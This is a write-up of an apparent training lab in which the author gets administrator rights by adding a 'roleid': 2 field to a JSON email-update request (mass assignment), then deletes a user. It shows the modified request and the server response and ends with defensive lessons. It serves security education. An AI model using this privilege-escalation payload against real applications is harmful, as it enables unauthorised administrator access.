**Category:** Access Control  
**Technique:** Vertical Privilege Escalation / Mass Assignment  
**Difficulty:** Apprentice  
**Status:** Solved

## 1. Objective

The objective of this lab is to log in as the user `wiener`, gain access to the administrator panel, and delete the user `carlos`.

The lab description mentions that the administrator panel is only accessible to logged-in users with a `roleid` of `2`.

## 2. Reconnaissance

First, I logged in using the provided credentials:

`wiener:peter`

After logging in, I tried to access the administrator panel:

```
GET /admin HTTP/2
```

However, the application denied access because my account did not have administrator privileges (`roleid: 2`).

Next, I navigated to the **My Account** page, where users can update their email addresses.

Using Burp Suite, I intercepted the email update request and noticed that the application accepted JSON data.

I decided to test whether I could add another property, `roleid`, to the request body.

## 3. Exploitation

I modified the email update request to include `roleid: 2`:

```
POST /my-account/change-email HTTP/2
Content-Type: application/json

{
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

The server returned a response containing the updated user information:

```
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "[REDACTED]",
  "roleid": 2
}
```

The response indicated that my account's `roleid` had been changed to `2`.

I then navigated to:

```
/admin
```

This time, the application allowed me to access the administrator panel.

I located the user `carlos` and deleted the account, successfully completing the lab.

### Evidence

![[Screenshot from 2026-10-25 16-40-37.png]]
  

## 4. Why It Works

The application fails to properly restrict which user properties can be modified through the email update endpoint.

Although the endpoint is intended to update only the user's email address, it also accepts the sensitive `roleid` property.

By adding `"roleid": 2` to the JSON request, I was able to change my account's role from a normal user to an administrator.

This is an example of **Mass Assignment**, also known as an over-posting vulnerability.

The Mass Assignment vulnerability allows me to modify a security-sensitive property, resulting in Vertical Privilege Escalation.

## 5. What I Learned

From this lab, I learned that:

- User profile update endpoints may accept more parameters than those visible in the frontend.
- Burp Suite can be used to modify JSON request bodies and test additional properties.
- Sensitive fields such as `roleid`, `isAdmin`, and `permissions` should never be directly modifiable by normal users.
- Mass Assignment vulnerabilities can lead to Vertical Privilege Escalation.
- Developers should explicitly allowlist editable properties and enforce authorization checks on the server side.

